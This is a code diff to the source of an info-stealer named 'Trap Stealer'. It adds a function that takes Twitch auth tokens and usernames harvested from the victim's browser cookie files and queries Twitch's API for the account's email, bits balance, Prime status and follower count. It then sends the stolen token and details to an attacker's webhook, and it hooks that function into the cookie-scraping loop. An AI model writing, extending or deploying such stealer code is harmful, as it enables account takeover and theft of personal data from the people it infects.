@@ -2460,6 +2460,131 @@ def patreon(cookie):
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except:pass
     
+def twitch_session(auth_token, username):
+    try:
+        url = 'https://gql.twitch.tv/gql'
+        headers = {
+            'Authorization': f'OAuth {auth_token}',
+            'Content-Type': 'application/json',
+        }
+
+        query = f'''
+        query {{
+            user(login: "{username}") {{
+                id
+                login
+                displayName
+                email
+                hasPrime
+                isPartner
+                language
+                profileImageURL(width: 300)
+                bitsBalance
+                followers {{
+                    totalCount
+                }}
+            }}
+        }}
+        '''
+        
+
+        data = {
+            "query": query
+        }
+
+        response = requests.post(url, headers=headers, json=data).json()
+        userid= response["data"]["user"]["id"] if response["data"]["user"]["id"] else "Coudn't get user ID"
+        login= response["data"]["user"]["login"] if response["data"]["user"]["login"] else "Coudn't get user login"
+        displayName= response["data"]["user"]["displayName"] if response["data"]["user"]["displayName"] else "Coudn't get user Display Name"
+        email = response["data"]["user"]["email"] if response["data"]["user"]["email"] else "Coudn't get user email"
+        hasPrime ='True' if response["data"]["user"]["hasPrime"] == True else "False"
+        
+        isPartner = 'True' if response["data"]["user"]["isPartner"] == True else "False"
+        language = response["data"]["user"]["language"] if response["data"]["user"]["language"] else "Coudn't get language"
+        pfp = response["data"]["user"]["profileImageURL"] if response["data"]["user"]["profileImageURL"] else "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+        bits = response["data"]["user"]["bitsBalance"] if response["data"]["user"]["bitsBalance"] else "0"
+        sub = response["data"]["user"]["followers"]["totalCount"] if response["data"]["user"]["followers"]["totalCount"] else "Coudn't get followers numbers"
+        data = {
+            "username": "Trap Stealer",
+            "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+            "content": "",
+            "embeds": [
+                {
+                    "title": f"🍪 Trap Stealer Twitch Session",
+                    "description": f"Founded user information ! :\n",
+                    "color": 0xffb6c1,
+                    "author": {
+                        "name": f"User information :",
+                        "icon_url": pfp
+                    },
+                    "footer": {
+                        "text": "Trap Stealer",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    },
+                    "thumbnail": {
+                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                    },
+                    "fields": [
+                        {
+                            "name": "✨ Cookie:",
+                            "value": f"Auth Token : `{auth_token}`\nUsername : `{username}`",
+                            "inline": False
+                        },
+                        {
+                            "name": "😊 User ID/Login/Display Name:",
+                            "value": f"`{userid}`\n`{login}`\n`{displayName}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "📧 Email:",
+                            "value": f"`{email}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "💻 Prime:",
+                            "value": f"`{hasPrime}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "😎 Username:",
+                            "value": f"`{username}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "💰 Bits:",
+                            "value": f"`{bits}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "👌 Partner:",
+                            "value": f"`{isPartner}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "🪙 Followers:",
+                            "value": f"`{sub}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "🎌 Language:",
+                            "value": f"`{language}`",
+                            "inline": True
+                        },
+                    ]
+                }
+            ],
+            "attachments": []
+        }
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+        
+    except Exception as e:
+        print(f"Error: {e}")
+        
 def spotify(cookie):
     try:
         headers ={
@@ -2625,6 +2750,11 @@ def cokssite():
                             parts = line.split()
                             second = parts[2]
                     if first != '' and  second != '':
+                        t = threading.Thread(target=twitch_session, args=[first, second])
+                        t.start()
+                        threa.append(t)
+                        l.append(first)
+                        l.append(second)
                         first, second = '',''
                 except:
                     pass
@@ -2634,7 +2764,7 @@ def cokssite():
                 thread.join()
     except Exception as e:
         pass
-                
+     
 def getCook(path, arg):
     try:
         global Cookies, CookiCount
